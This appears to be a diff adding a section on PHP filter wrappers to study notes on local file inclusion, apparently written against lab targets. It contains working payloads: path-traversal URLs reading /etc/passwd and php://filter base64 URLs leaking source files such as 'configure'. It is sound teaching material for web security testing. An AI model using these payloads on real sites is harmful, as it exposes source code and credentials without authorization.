@@ -199,3 +199,44 @@ http://83.136.253.59:34423/index.php?language=languages/....\/....\/....\/....\/
 http://83.136.253.59:34423/index.php?language=languages%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%65%74%63%2f%70%61%73%73%77%64%25%30%30%2e%70%68%70
 ```
 
+---
+
+## PHP Filter Wrappers
+
+An LFI vulnerability in a PHP application may be levereged and extended through **PHP wrappers**. These wrappers are generally used by developers in order to access I/O streams at the application level. PHP wrappers can be utilized by an attacker in order to read source code or execute system commands. 
+
+Filter wrappers filter input. There are four filter categories:
+
+- String filters
+- Conversion filters
+- Compression filters
+- Encryption filters
+
+A filter that is very useful for LFI attacks is a conversion filter called `convert.base64-encode`. 
+
+When including PHP files through LFI, the files are usually rendered as regular HTML pages. This is useful in some cases, but not if we want to read the actual PHP source code. However, the `convert.base64-encode` may allow us to base64 encode the source code, instead of rendering the page. 
+
+**Examples:**
+
+```bash
+# Syntax
+php://filter/read=convert.base64-encode/resource=<file>
+
+php://filter/read=convert.base64-encode/resource=index
+
+php://filter/read=convert.base64-encode/resource=configure
+```
+
+```bash
+# Base64 encode source code
+http://94.237.57.211:56084/index.php?language=php://filter/read=convert.base64-encode/resource=configure
+```
+
+![Filtered output](images/filter-wrapper.png)
+
+```bash
+# Decode base64 string
+echo '<string>' | base64 -d
+```
+
+![Filtered output](images/source-code.png)
